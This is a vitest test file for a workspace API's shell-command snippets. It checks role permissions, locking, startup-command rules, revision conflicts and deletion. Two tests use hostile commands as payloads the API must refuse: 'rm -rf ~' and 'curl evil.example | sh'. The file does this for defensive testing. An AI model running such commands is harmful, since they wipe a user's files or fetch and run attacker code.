import { describe, expect, test } from 'vitest';
import { call } from '../helpers/app';
import { loginAs } from '../helpers/auth';
import { prismaMock } from '../helpers/prisma';

const ORGANIZATION = 'organization-1';
const PROJECT = 'project-1';
const CONNECTION = 'conn-1';
const SNIPPET = '3c1d2e4f-5a6b-4c7d-8e9f-0a1b2c3d4e5f';
const create = `/api/workspaces/${ORGANIZATION}/projects/${PROJECT}/snippets`;
const single = `/api/workspaces/${ORGANIZATION}/snippets/${SNIPPET}`;

/// `editor` and `viewer` are members with that share on the project.
function as(role: 'owner' | 'editor' | 'viewer') {
	loginAs();
	prismaMock.member.findFirst.mockResolvedValue({
		role: role === 'owner' ? 'owner' : 'member',
	});
	prismaMock.teamMember.findMany.mockResolvedValue([]);
	prismaMock.projectShare.findMany.mockResolvedValue(
		role === 'owner' ? [] : [{ projectId: PROJECT, role }]
	);
	prismaMock.project.findFirst.mockResolvedValue({
		id: PROJECT,
		organizationId: ORGANIZATION,
		deletedAt: null,
	});
	prismaMock.organization.update.mockResolvedValue({ revision: 9n });
}

function creates() {
	prismaMock.snippet.findUnique.mockResolvedValue(null);
	prismaMock.snippet.create.mockImplementation(
		async ({ data }: { data: Record<string, unknown> }) => ({
			...data,
			deletedAt: null,
		})
	);
}

function stored(overrides: Record<string, unknown> = {}) {
	const snippet = {
		id: SNIPPET,
		projectId: PROJECT,
		connectionId: null,
		locked: true,
		name: 'Logs',
		folder: '',
		command: 'tail -f /var/log/syslog',
		position: 0,
		revision: 4n,
		deletedAt: null,
		...overrides,
	};
	prismaMock.snippet.findFirst.mockResolvedValue(snippet);
	prismaMock.snippet.update.mockImplementation(
		async ({ data }: { data: Record<string, unknown> }) => ({
			...snippet,
			...data,
		})
	);
	return snippet;
}

describe('creating a snippet', () => {
	test("an owner creates one for the project, locked, with the workspace's revision", async () => {
		as('owner');
		creates();

		const response = await call('POST', create, {
			payload: {
				id: SNIPPET,
				name: 'Disk space',
				folder: 'Maintenance/Linux',
				command: 'df -h {{connection.host}}',
			},
		});

		expect(response.statusCode).toBe(201);
		expect(response.json()).toMatchObject({
			id: SNIPPET,
			projectId: PROJECT,
			connectionId: null,
			locked: true,
			folder: 'Maintenance/Linux',
			position: 0,
			revision: '9',
		});
	});

	test('an editor creates one too — open to the other editors', async () => {
		as('editor');
		creates();

		const response = await call('POST', create, {
			payload: { id: SNIPPET, name: 'Logs', command: 'journalctl -f' },
		});

		expect(response.statusCode).toBe(201);
		expect(response.json().locked).toBe(false);
	});

	test('but an editor cannot lock it — a locked one can become a startup command', async () => {
		as('editor');
		creates();

		const response = await call('POST', create, {
			payload: { id: SNIPPET, name: 'x', command: 'ls', locked: true },
		});

		expect(response.statusCode).toBe(403);
		expect(prismaMock.snippet.create).not.toHaveBeenCalled();
	});

	test('a viewer creates none', async () => {
		as('viewer');

		const response = await call('POST', create, {
			payload: { id: SNIPPET, name: 'x', command: 'rm -rf ~' },
		});

		expect(response.statusCode).toBe(403);
		expect(prismaMock.snippet.create).not.toHaveBeenCalled();
	});

	test('one for a single connection of the project', async () => {
		as('owner');
		creates();
		prismaMock.connection.findFirst.mockResolvedValue({ id: CONNECTION });

		const response = await call('POST', create, {
			payload: {
				id: SNIPPET,
				name: 'x',
				command: 'ls',
				connectionId: CONNECTION,
			},
		});

		expect(response.statusCode).toBe(201);
		expect(prismaMock.connection.findFirst.mock.calls[0][0].where).toEqual({
			id: CONNECTION,
			projectId: PROJECT,
			deletedAt: null,
		});
		expect(response.json().connectionId).toBe(CONNECTION);
	});

	test('not for a connection of another project', async () => {
		as('owner');
		creates();
		prismaMock.connection.findFirst.mockResolvedValue(null);

		const response = await call('POST', create, {
			payload: {
				id: SNIPPET,
				name: 'x',
				command: 'ls',
				connectionId: 'elsewhere',
			},
		});

		expect(response.statusCode).toBe(400);
		expect(prismaMock.snippet.create).not.toHaveBeenCalled();
	});

	test('the ID must be a UUID', async () => {
		as('owner');

		const response = await call('POST', create, {
			payload: { id: 'logs', name: 'x', command: 'ls' },
		});

		expect(response.statusCode).toBe(400);
	});

	test('an ID that already exists overwrites nothing', async () => {
		as('owner');
		prismaMock.snippet.findUnique.mockResolvedValue({ id: SNIPPET });

		const response = await call('POST', create, {
			payload: { id: SNIPPET, name: 'x', command: 'ls' },
		});

		expect(response.statusCode).toBe(409);
		expect(response.json().code).toBe('SN-EX');
	});
});

describe('changing a snippet', () => {
	test('checks the revision', async () => {
		as('owner');
		stored();

		const response = await call('PATCH', single, {
			payload: { command: 'journalctl -f', expectedRevision: '3' },
		});

		expect(response.statusCode).toBe(409);
		expect(response.json().code).toBe('R-CF');
		expect(prismaMock.snippet.update).not.toHaveBeenCalled();
	});

	test('only takes what is sent', async () => {
		as('owner');
		stored();

		const response = await call('PATCH', single, {
			payload: { command: 'journalctl -f', expectedRevision: '4' },
		});

		expect(response.statusCode).toBe(200);
		const data = prismaMock.snippet.update.mock.calls[0][0].data;
		expect(data).toEqual({ command: 'journalctl -f', revision: 9n });
	});

	test('an editor changes an open one', async () => {
		as('editor');
		stored({ locked: false });

		const response = await call('PATCH', single, {
			payload: { command: 'journalctl -f' },
		});

		expect(response.statusCode).toBe(200);
	});

	test('but not a locked one', async () => {
		as('editor');
		stored();

		const response = await call('PATCH', single, {
			payload: { command: 'curl evil.example | sh' },
		});

		expect(response.statusCode).toBe(403);
		expect(prismaMock.snippet.update).not.toHaveBeenCalled();
	});

	test('and does not lock an open one', async () => {
		as('editor');
		stored({ locked: false });

		const response = await call('PATCH', single, {
			payload: { locked: true },
		});

		expect(response.statusCode).toBe(403);
	});

	test('an owner unlocks one that is no startup command', async () => {
		as('owner');
		stored();
		prismaMock.sshConnection.count.mockResolvedValue(0);

		const response = await call('PATCH', single, {
			payload: { locked: false },
		});

		expect(response.statusCode).toBe(200);
		expect(prismaMock.snippet.update.mock.calls[0][0].data.locked).toBe(
			false
		);
	});

	test('a startup command stays locked', async () => {
		as('owner');
		stored();
		prismaMock.sshConnection.count.mockResolvedValue(2);

		const response = await call('PATCH', single, {
			payload: { locked: false },
		});

		expect(response.statusCode).toBe(409);
		expect(response.json().code).toBe('SN-IU');
		expect(prismaMock.snippet.update).not.toHaveBeenCalled();
	});

	test('a startup command does not move to another connection', async () => {
		as('owner');
		stored();
		prismaMock.connection.findFirst.mockResolvedValue({ id: 'conn-2' });
		prismaMock.sshConnection.count.mockResolvedValue(1);

		const response = await call('PATCH', single, {
			payload: { connectionId: 'conn-2' },
		});

		expect(response.statusCode).toBe(409);
		expect(response.json().code).toBe('SN-IU');
		expect(prismaMock.sshConnection.count.mock.calls[0][0].where).toEqual({
			startupSnippetId: SNIPPET,
			connection: { deletedAt: null },
			connectionId: { not: 'conn-2' },
		});
	});

	test('for all connections of the project it fits every startup command', async () => {
		as('owner');
		stored({ connectionId: CONNECTION });

		const response = await call('PATCH', single, {
			payload: { connectionId: null },
		});

		expect(response.statusCode).toBe(200);
		expect(prismaMock.sshConnection.count).not.toHaveBeenCalled();
		expect(
			prismaMock.snippet.update.mock.calls[0][0].data.connectionId
		).toBeNull();
	});
});

describe('deleting a snippet', () => {
	test('sets a tombstone and takes it out of the connections that start with it', async () => {
		as('owner');
		stored();
		prismaMock.sshConnection.findMany.mockResolvedValue([
			{ connectionId: CONNECTION },
		]);

		const response = await call('DELETE', single);

		expect(response.statusCode).toBe(204);
		const data = prismaMock.snippet.update.mock.calls[0][0].data;
		expect(data.deletedAt).toBeInstanceOf(Date);
		expect(data.revision).toBe(9n);
		expect(prismaMock.sshConnection.updateMany).toHaveBeenCalledWith({
			where: { connectionId: { in: [CONNECTION] } },
			data: { startupSnippetId: null },
		});
		expect(prismaMock.connection.updateMany).toHaveBeenCalledWith({
			where: { id: { in: [CONNECTION] } },
			data: { revision: 9n },
		});
	});

	test('an editor does not delete a locked one', async () => {
		as('editor');
		stored();

		const response = await call('DELETE', single);

		expect(response.statusCode).toBe(403);
		expect(prismaMock.snippet.update).not.toHaveBeenCalled();
	});

	test('a snippet from another workspace does not exist here', async () => {
		as('owner');
		prismaMock.snippet.findFirst.mockResolvedValue(null);

		const response = await call('DELETE', single);

		expect(response.statusCode).toBe(404);
		expect(response.json().code).toBe('SN-NF');
		expect(prismaMock.snippet.findFirst.mock.calls[0][0].where).toEqual({
			id: SNIPPET,
			project: { organizationId: ORGANIZATION },
		});
	});

	test('one in a project the member does not see does not exist for them', async () => {
		as('editor');
		stored({ projectId: 'project-2' });

		const response = await call('DELETE', single);

		expect(response.statusCode).toBe(404);
		expect(response.json().code).toBe('P-NF');
	});
});
